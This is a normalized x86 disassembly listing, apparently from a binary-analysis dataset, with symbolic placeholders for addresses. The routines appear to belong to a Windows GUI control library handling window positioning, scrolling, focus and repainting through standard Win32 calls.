call sub_4592cc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_442f30
test eax eax
jne r-xdata
sub_447e20
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_447c14
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_442f30
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4592cc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_442f30
test eax eax
jne r-xdata
sub_447e7c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4592cc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_442f30
mov [ esi + 0xc ] eax
sub_447eb0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4413b8
mov eax ebx
mov si 0xffd0
call sub_4038bc
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_441704
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_447f88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_445248
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4038bc
inc edi
dec ebx
jne r-xdata
sub_447fd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444dec
xor eax eax
push ebp
push sub_44806e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447f88
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441980
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448075
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44807c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_444e14
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_445248
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44816c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4161fc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_416090
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41621c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4161a0
call sub_448484
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4161a0
call sub_448484
sub_448244
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44816c
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4482a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_448484
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_448484
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
test eax eax
jne r-xdata
sub_448308
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_442f30
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
sub_44838c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_441704
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4483c4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4592cc
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_448404
push ebx
mov ebx eax
mov eax ebx
call sub_4592cc
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45d03c
pop ebx
retn
mov eax ebx
call sub_4592f4
mov eax ebx
call sub_448484
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44843c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448460
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_448460
sub_448498
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_414b64
mov eax edi
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_445248
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44852c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_448484
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_448564
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448788
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448484
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4038bc
sub_448620
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4161fc
pop esi
pop ebx
retn
sub_448644
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_448620
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_416090
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41621c
sub_4486b8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_448788
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_442f30
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_448718
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44877c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448783
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4038bc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4061ac
sub_448794
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4413b8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44884c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4161a0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_416044
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4038bc
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4488ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4489a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4038bc
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489a9
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4161fc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4161a0
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_4489b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov ecx [ ebp + 0x8 ]
push ecx
xor cl 0x1
push ecx
mov cl [ ebp - 0x1 ]
call sub_4488ac
mov edx eax
test edx edx
je r-xdata
pop ecx
pop ebp
retn 0x4
mov eax edx
mov edx [ eax ]
call [ edx + 0xc0 ]
sub_4489e4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4592cc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4488ac
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4488ac
mov edx eax
mov eax esi
call sub_45cf3c
sub_448a28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445248
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_448a70
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44816c
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441fd4
sub_448ab8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_448b3c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_445284
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_448efe
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_445284
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_448ab8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
